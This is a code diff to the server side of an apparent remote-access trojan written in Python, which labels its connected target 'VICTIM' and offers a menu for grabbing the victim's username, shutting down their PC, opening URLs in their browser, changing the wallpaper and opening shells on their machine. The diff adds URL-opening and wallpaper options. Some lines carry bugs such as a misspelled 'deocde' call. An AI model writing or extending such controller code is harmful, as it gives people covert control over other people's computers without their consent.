@@ -4,11 +4,13 @@ import os
 from typing import *
 import logging
 import sys
+import re
+_VALID_URL_PATTERN=re.compile(r'^(?:http|ftp)s?://'r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'r'localhost|'r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'r'(?::\d+)?'r'(?:/?|[/?]\S+)$',re.IGNORECASE)
 logging.basicConfig(filename="logs.log",level=logging.INFO,format="[%(asctime)s] %(levelname)s - %(message)s",datefmt="%H:%M:%S")
 class Server():
     def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
         self.c=c
-        choices=[i for i in range(1,9)]
+        choices=[i for i in range(1,10)]
         print(chalk.red(f"SUCCESSFULLY ESTABLISHED A CONNECTION WITH VICTIM. VICTIM'S IP : {addr}"))
         logging.info(f"SUCCESSFULLY ESTABLISHED A CONNECTION WITH VICTIM. VICTIM'S IP : {addr}")
         msg="""
@@ -19,9 +21,10 @@ class Server():
         3.) GET VICTIM'S WINDOWS USERNAME
         4.) SHUTDOWN VICTIM'S PC
         5.) OPEN URL IN VICTIM'S BROWSER
-        6.) OPEN VICTIM'S BASH
-        7.) OPEN VICTIM'S POWERSHELL
-        8.) OPEN VICTIM'S COMMAND PROMPT
+        6.) CHANGE VICTIM'S WALLPAPER
+        7.) OPEN VICTIM'S BASH
+        8.) OPEN VICTIM'S POWERSHELL
+        9.) OPEN VICTIM'S COMMAND PROMPT
         """
         print(chalk.red(msg))
         choice=input(chalk.red("CHOOSE AN OPTION : "))
@@ -51,9 +54,19 @@ class Server():
                 print(self.c.recv(4096).deocde())
                 logging.debug(self.c.recv(4096).decode())
             # Open URL
-            elif choice==5:...
+            elif choice==5:
+                _url=input("Enter The URL You Want To Open In Victim's PC : ")
+                for i in re.finditer(_VALID_URL_PATTERN,_url):
+                    if i.string !="" or i.string is not None:
+                        self.c.send(f"open_url {_url}".encode())
+                        print(self.c.recv(1024).decode())
+                        logging.debug(self.c.recv(1024).decode())
+                        break
+            # Change Wallpaper
             elif choice==6:...
             elif choice==7:...
+            elif choice==8:...
+            elif choice==9:...
     @staticmethod
     def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
         s=socket.socket()
@@ -65,7 +78,7 @@ class Server():
         c,addr=s.accept()
         if sys.platform=="win32":
             os.system("cls")
-        else:
+        elif sys.platform!="win32":
             os.system("clear")
         return (c,addr)
 if __name__ == "__main__":
